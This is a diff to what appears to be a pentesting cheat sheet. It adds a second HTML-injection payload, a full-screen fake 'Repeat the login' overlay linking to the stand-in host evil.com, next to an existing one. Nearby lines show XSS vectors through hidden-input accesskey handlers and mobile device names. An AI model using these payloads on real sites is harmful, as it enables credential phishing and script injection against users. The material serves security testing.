@@ -2097,9 +2097,12 @@ Manually testing for XXE vulnerabilities generally involves
 
 **Payloads**
 - HTML injection
-  ```HTML
-  <p style="color:red">ERROR! Repeat the login</p>Membership No.<br/><input><br/><a href=http://evil.com><br><input type=button value="Login"></a><br/><img src=http://evil.com style="visibility:hidden">
-  ```
+  - ```HTML
+    <p style="color:red">ERROR! Repeat the login</p>Membership No.<br/><input><br/><a href=http://evil.com><br><input type=button value="Login"></a><br/><img src=http://evil.com style="visibility:hidden">
+    ```
+  - ```HTML
+    <div style="background-color:white;position:fixed;width:100%;height:100%;top:0px;left:0px;z-index:1000;margin: auto;padding: 10px;"><p style="color:red">ERROR! Repeat the login</p>Membership No.<br/><input><br/><a href=http://evil.com><br><input type=button value="Login"></a></div>
+    ```
 - [For hidden inputs](https://portswigger.net/research/xss-in-hidden-input-fields): `accesskey="X" onclick="alert(1)"` then Press ALT+SHIFT+X on Windows / CTRL+ALT+X on OS X
 - For **mobile applications**: try to use as a vector the name of the phone with a payload like `"/><script>alert(1)</script>`
 - iframe + base64 encoded SVG 
